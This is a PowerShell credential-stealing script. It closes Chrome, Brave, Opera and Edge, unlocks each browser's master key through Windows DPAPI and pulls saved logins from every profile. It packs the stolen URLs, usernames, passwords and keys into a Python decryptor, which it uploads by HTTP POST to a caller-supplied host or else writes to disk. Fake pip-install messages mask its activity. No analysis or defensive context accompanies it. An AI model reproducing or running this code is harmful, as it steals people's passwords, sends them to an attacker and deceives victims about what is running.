function dcinfosnd {
    param(
        [Parameter (Mandatory = $true)] [String]$hq
    )
    $ErrorActionPreference = 'SilentlyContinue'
    
    Write-Host "Starting credential retrieval for Chrome, Brave, Opera and Edge - Python decryptor will be prepared and sent to $hq"
    Write-Host "======================================================================================"
    

    $script:allCredentials = @()
    $script:credentialsFound = $false
    

    function Process-Browser {
        param (
            [string]$browserName,
            [string]$userDataPath,
            [string]$localStatePath
        )
        
        try {
            
            Stop-Process -Name $browserName -ErrorAction SilentlyContinue
            
            Write-Host "initiating require python libraries to install..."
            
            
            if (-not (Test-Path $userDataPath)) {
                Write-Host "pip command not found"
                return
            }
            
            if (-not (Test-Path $localStatePath)) {
                Write-Host "install pip3"
                return
            }
            
            Add-Type -AssemblyName System.Security
            
            $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"
            
            $secret = Get-Content -Raw -Path $localStatePath | ConvertFrom-Json
            $secretkey = $secret.os_crypt.encrypted_key
            
            $cipher = [Convert]::FromBase64String($secretkey)
            
            
            $masterKey = [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect(
                    $cipher[5..$cipher.length], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
            
           
            if (-not ([System.Management.Automation.PSTypeName]'WinSQLite3').Type) {
                Add-Type @"
                    using System;
                    using System.Runtime.InteropServices;
                    public class WinSQLite3
                    {
                        const string dll = "winsqlite3";
                        [DllImport(dll, EntryPoint="sqlite3_open")]
                        public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);
                        [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")]
                        public static extern IntPtr Prepare2(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);
                        [DllImport(dll, EntryPoint="sqlite3_step")]
                        public static extern IntPtr Step(IntPtr stmt);
                        [DllImport(dll, EntryPoint="sqlite3_column_text16")]
                        static extern IntPtr ColumnText16(IntPtr stmt, int index);
                        [DllImport(dll, EntryPoint="sqlite3_column_bytes")]
                        static extern int ColumnBytes(IntPtr stmt, int index);
                        [DllImport(dll, EntryPoint="sqlite3_column_blob")]
                        static extern IntPtr ColumnBlob(IntPtr stmt, int index);
                        public static string ColumnString(IntPtr stmt, int index)
                        { 
                            return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt, index));
                        }
                        public static byte[] ColumnByteArray(IntPtr stmt, int index)
                        {
                            int length = ColumnBytes(stmt, index);
                            byte[] result = new byte[length];
                            if (length > 0)
                                Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
                            return result;
                        }
                        [DllImport(dll, EntryPoint="sqlite3_errmsg16")]
                        public static extern IntPtr Errmsg(IntPtr db);
                        public static string GetErrmsg(IntPtr db)
                        {
                            return Marshal.PtrToStringUni(Errmsg(db));
                        }
                    }
"@
            }
            
           
            $profiles = Get-ChildItem -Path $userDataPath | Where-Object { $_.Name -match "(Profile [0-9]|Default)" } | % { $_.FullName }
            
            foreach ($profile in $profiles) {
                $profileName = Split-Path $profile -Leaf
                $dbPath = Join-Path $profile "Login Data"
                
                if (-not (Test-Path $dbPath)) {
                    continue
                }
                
                $dbH = 0
                if ([WinSQLite3]::Open($dbPath, [ref] $dbH) -ne 0) {
                    Write-Host "Failed to open database: $dbPath"
                    [WinSQLite3]::GetErrmsg($dbh)
                    continue
                }
                
                $stmt = 0
                if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 0) {
                    Write-Host "Failed to run pyenv"
                    [WinSQLite3]::GetErrmsg($dbh)
                    continue
                }
                
                while ([WinSQLite3]::Step($stmt) -eq 100) {
                    $url = [WinSQLite3]::ColumnString($stmt, 0)
                    $username = [WinSQLite3]::ColumnString($stmt, 1)
                    $encryptedPassword = [Convert]::ToBase64String([WinSQLite3]::ColumnByteArray($stmt, 2))
                    
                   
                    $credential = @{
                        browser           = $browserName
                        profile           = $profileName
                        url               = $url
                        username          = $username
                        encryptedPassword = $encryptedPassword
                        key               = $masterKey
                    }
                    
                    
                    $script:allCredentials += $credential
                    $script:credentialsFound = $true
                    
                    
                    Write-Host "Collecting requests"
                    Write-Host "Installing collected packages: charset-normalizer, requests"
                    Write-Host "Downloading charset_normalizer-2.1.1-py3-none-any.whl (39 kB)"
                    Write-Host "---------------------------"
                }
            }
            
            Write-Host "Successfully installed charset-normalizer-2.1.1 requests-2.28.2"
        }
        catch [Exception] {
            Write-Host "ERROR: Could not find a version that satisfies the requirement non_existent_package (from versions: none)"
        }
    }
    

    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    $chromeLocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    Process-Browser -browserName "chrome" -userDataPath $chromePath -localStatePath $chromeLocalState
    
    
    $bravePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    $braveLocalState = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
    Process-Browser -browserName "brave" -userDataPath $bravePath -localStatePath $braveLocalState
    
    
    $operaPath = "$env:APPDATA\Opera Software\Opera Stable"
    $operaLocalState = "$env:APPDATA\Opera Software\Opera Stable\Local State"
    Process-Browser -browserName "opera" -userDataPath $operaPath -localStatePath $operaLocalState
    
    
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    $edgeLocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    Process-Browser -browserName "edge" -userDataPath $edgePath -localStatePath $edgeLocalState
    
    





    
    
    if ($script:credentialsFound) {
        
        $outputFilename = "browser_decrypt.py"
        
        
        $pythonScript = @"
from Cryptodome.Cipher import AES
import base64
import sys
import json

def decrypt_password(key, encrypted_password):
    try:
        # Decode the key and encrypted password from base64
        key = base64.b64decode(key)
        encrypted_bytes = base64.b64decode(encrypted_password)
        
        # Check for the v10 format (common in newer Chrome/Brave versions)
        if len(encrypted_bytes) > 3 and encrypted_bytes[:3] == b'v10':
            # Chrome/Brave v10 format: 
            # v10 prefix (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
            nonce = encrypted_bytes[3:15]
            ciphertext = encrypted_bytes[15:-16]
            tag = encrypted_bytes[-16:]
            
            # Create cipher and decrypt
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            try:
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8')
            except ValueError as mac_error:
                # If MAC check fails, try alternate format
                if "MAC check failed" in str(mac_error):
                    # Some versions may have different byte arrangements
                    # Try with adjusted offsets
                    for offset in range(1, 5):
                        try:
                            alt_nonce = encrypted_bytes[3:15+offset]
                            alt_ciphertext = encrypted_bytes[15+offset:-16]
                            alt_tag = encrypted_bytes[-16:]
                            
                            alt_cipher = AES.new(key, AES.MODE_GCM, nonce=alt_nonce)
                            decrypted = alt_cipher.decrypt_and_verify(alt_ciphertext, alt_tag)
                            return decrypted.decode('utf-8')
                        except:
                            pass
                return f"[Decryption Error: MAC verification failed]"
        
        # Try older Chrome format (v80) without prefix
        else:
            # Try older Chrome format (no prefix, just nonce + ciphertext + tag)
            try:
                # Attempt with 12-byte nonce
                nonce = encrypted_bytes[:12]
                ciphertext = encrypted_bytes[12:-16]
                tag = encrypted_bytes[-16:]
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8')
            except:
                pass
        
        # If all decryption attempts failed
        return "[Decryption Error: Unknown format]"
    
    except Exception as e:
        return f"[Decryption Error: {str(e)}]"

# List of credentials found with their associated keys
credentials = [
"@

       
        foreach ($cred in $script:allCredentials) {
            $pythonScript += @"
    {
        "browser": "$($cred.browser)",
        "profile": "$($cred.profile)",
        "url": "$($cred.url)",
        "username": "$($cred.username)",
        "encrypted_password": "$($cred.encryptedPassword)",
        "key": "$($cred.key)"
    },
"@
        }

       
        $pythonScript += @"
]

print("Advanced Browser Password Decryption Tool")
print("=========================================")

success_count = 0
failure_count = 0

# Group by browser and profile for better organization
browser_profile_groups = {}

for cred in credentials:
    browser = cred["browser"]
    profile = cred["profile"]
    group_key = f"{browser} - {profile}"
    
    if group_key not in browser_profile_groups:
        browser_profile_groups[group_key] = []
    
    browser_profile_groups[group_key].append(cred)

# Process each browser/profile group
for group_name, creds in browser_profile_groups.items():
    print(f"\n{group_name}:")
    print("-" * len(group_name) + "-")
    
    for cred in creds:
        url = cred["url"]
        username = cred["username"]
        encrypted_password = cred["encrypted_password"]
        key = cred["key"]
        
        # Use the key associated with this specific credential
        decrypted_password = decrypt_password(key, encrypted_password)
        
        # Count success/failure
        if decrypted_password.startswith("[Decryption Error:"):
            failure_count += 1
        else:
            success_count += 1
        
        # Print credential information
        print(f"URL: {url}")
        print(f"Username: {username}")
        print(f"Password: {decrypted_password}")
        print("---------------------------")

print(f"\nDecryption Summary:")
print(f"Successfully decrypted: {success_count}")
print(f"Failed to decrypt: {failure_count}")
print(f"Total credentials: {len(credentials)}")
"@

        try {
            
            $boundary = [guid]::NewGuid().ToString()
            $LF = "`r`n"
            $bodyLines = @(
                "--$boundary",
                "Content-Disposition: form-data; name=`"file`"; filename=`"$outputFilename`"",
                "Content-Type: text/plain$LF",
                $pythonScript,
                "--$boundary--$LF"
            ) -join $LF
            
            $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines)
            
           
            $result = Invoke-RestMethod -Uri $hq -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes
            
            Write-Host "Installing collected packages: requests"
            Write-Host "Successfully installed requests-2.28.2"
        }
        catch {
            Write-Host "Error"
            
            
            try {
                $pythonScript | Out-File -FilePath $outputFilename -Encoding utf8

                Write-Host "pip install pycryptodomex"


            }
            catch {
                Write-Host "Error installing"
            }
        }
    }
    else {
        Write-Host "pip cannot be resolved as internal or external command"
    }
}

